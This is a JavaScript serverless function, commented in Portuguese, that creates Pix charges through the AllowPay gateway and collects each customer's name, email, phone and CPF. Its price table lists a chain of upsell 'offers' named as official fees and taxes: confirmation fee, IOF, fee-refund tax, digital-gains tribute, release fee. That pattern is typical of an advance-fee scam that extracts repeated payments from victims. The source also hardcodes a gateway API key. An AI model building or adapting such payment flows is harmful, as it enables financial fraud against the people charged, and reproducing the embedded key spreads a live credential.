// Vercel Serverless Function — cria o Pix na AllowPay.
// Env vars (Vercel > Settings > Environment Variables):
//   ALLOWPAY_API_KEY   (obrigatória)
//   SITE_ORIGIN        ex.: https://minhaloja.com  (vai no header X-AllowPay-Origin)
//   WEBHOOK_SECRET     (opcional)
const BASE = "https://allow-gi0i.onrender.com";
// COLE AQUI a chave da AllowPay (fica só no servidor, o navegador nunca vê).
const ALLOWPAY_API_KEY = "allow_apikey_07nn1znm0iyi";
// Preços em centavos — definidos aqui, nunca pelo cliente. O cliente só manda o id da oferta.
const OFFERS = {
  default: { amount: 2190, name: "Taxa de Confirmação" },
  up1: { amount: 2340, name: "Taxa de IOF" },
  up2: { amount: 2600, name: "Taxa Única de Ativação" },
  up3: { amount: 2500, name: "Taxa de Prioridade" },
  up4: { amount: 2200, name: "Taxa de Atualização de Vaga" },
  up5: { amount: 3276, name: "Guia de Recolhimento Única" },
  up6: { amount: 3893, name: "Taxa Administrativa" },
  up7: { amount: 2442, name: "Imposto sobre Estorno de Taxas" },
  up8: { amount: 1946, name: "Taxa Única de Liberação" },
  up9: { amount: 1473, name: "Taxa de Antecipação Prioritária" },
  up10: { amount: 4631, name: "Tributo sobre Ganhos Digitais" },
};

function cpfValido(c) {
  if (!/^\d{11}$/.test(c) || /^(\d)\1{10}$/.test(c)) return false;
  for (const n of [9, 10]) {
    let s = 0;
    for (let i = 0; i < n; i++) s += +c[i] * (n + 1 - i);
    if (((s * 10) % 11) % 10 !== +c[n]) return false;
  }
  return true;
}

export default async function handler(req, res) {
  if (req.method !== "POST") return res.status(405).json({ error: "Method not allowed" });
  const key = process.env.ALLOWPAY_API_KEY || ALLOWPAY_API_KEY;
  if (!key || key.startsWith("COLE_AQUI")) return res.status(500).json({ error: "Gateway não configurado" });

  const b = typeof req.body === "string" ? JSON.parse(req.body || "{}") : req.body || {};
  const c = b.customer || {};
  const name = String(c.name || "").trim();
  const email = String(c.email || "").trim();
  const cellphone = String(c.cellphone || "").replace(/\D/g, "");
  const taxId = String(c.taxId || "").replace(/\D/g, "");

  if (!name || !email || cellphone.length < 10 || !cpfValido(taxId)) {
    return res.status(400).json({ error: "Dados do cliente inválidos (nome, e-mail, telefone ou CPF)." });
  }

  const offerId = Object.hasOwn(OFFERS, b.offerId) ? b.offerId : "default";
  const AMOUNT = OFFERS[offerId].amount;

  const origin = process.env.SITE_ORIGIN || `https://${req.headers.host}`;
  const payload = {
    api_key: key,
    amount: AMOUNT,
    description: OFFERS[offerId].name,
    customer: { name, email, cellphone, taxId },
    webhook_url: `${origin}/api/pix/webhook`,
  };
  if (process.env.WEBHOOK_SECRET) payload.webhook_secret = process.env.WEBHOOK_SECRET;

  try {
    const r = await fetch(`${BASE}/api/v2/allowpay-seller/create-pix`, {
      method: "POST",
      headers: { "Content-Type": "application/json", "X-AllowPay-Origin": origin },
      body: JSON.stringify(payload),
    });
    const d = await r.json().catch(() => ({}));
    if (!r.ok || !d.txid || !d.pix_code) {
      return res.status(r.ok ? 502 : r.status).json({ error: d.error || "Falha ao criar o Pix" });
    }
    // route vai embutido no id (sem banco): "route:txid"
    return res.status(200).json({
      pixCode: d.pix_code,
      qrCodeUrl: d.pix_qr_code || null,
      transactionId: `${d.route}:${d.txid}`,
      amount: AMOUNT,
      offerId,
    });
  } catch (e) {
    return res.status(502).json({ error: "Gateway indisponível" });
  }
}
